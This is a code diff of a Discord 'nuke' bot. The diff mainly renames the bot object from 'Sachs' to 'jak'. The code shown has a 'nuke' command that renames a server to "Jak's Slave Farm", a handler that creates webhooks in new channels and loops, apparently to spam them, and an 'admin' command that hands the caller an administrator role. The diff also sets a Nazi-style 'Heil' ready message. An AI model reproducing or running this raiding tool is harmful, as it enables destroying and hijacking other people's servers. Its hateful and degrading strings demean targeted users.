@@ -19,7 +19,7 @@ https://media.discordapp.net/attachments/1116771135636373596/1121139964294479962
 """
 rq = rq_.Session()
 
-Sachs = commands.Bot(command_prefix=prefix, intents=intents, case_insensitive=True)
+jak = commands.Bot(command_prefix=prefix, intents=intents, case_insensitive=True)
 
 
 ### Functions ###
@@ -69,12 +69,12 @@ async def deleteRole(guild, role, session):
 
 
 ### Bot Events ###
-@Sachs.event
+@jak.event
 async def on_ready():
-    print(f"{Fore.RED}Ready to cause Mayhem{Fore.RESET}")
+    print(f"{Fore.RED}Heil The Elitest{Fore.RESET}")
 
 
-@Sachs.event
+@jak.event
 async def on_guild_channel_create(channel):
     webhook = await channel.create_webhook(name="Jak")
     while True:
@@ -83,7 +83,7 @@ async def on_guild_channel_create(channel):
 
 ### Bot Commands ###
 """
-@Sachs.command()
+@jak.command()
 async def cdel(ctx):
     channels = []
 
@@ -98,7 +98,7 @@ async def cdel(ctx):
 """
 
 
-@Sachs.command(aliases=['beam', 'fuck', 'wizz'])
+@jak.command(aliases=['beam', 'fuck', 'wizz'])
 async def nuke(ctx):
     guild = ctx.guild
     await guild.edit(name="Jak's Slave Farm | Yugoyuri!")
@@ -138,7 +138,7 @@ async def nuke(ctx):
       await asyncio.gather(*tasks)
     """
 
-@Sachs.command()
+@jak.command()
 async def admin(ctx):
   guild = ctx.guild
   adminperms = discord.Permissions(administrator=True)
@@ -146,4 +146,4 @@ async def admin(ctx):
   user = ctx.author
   await user.add_roles(role)
 
-Sachs.run(TOKEN)
+jak.run(TOKEN)
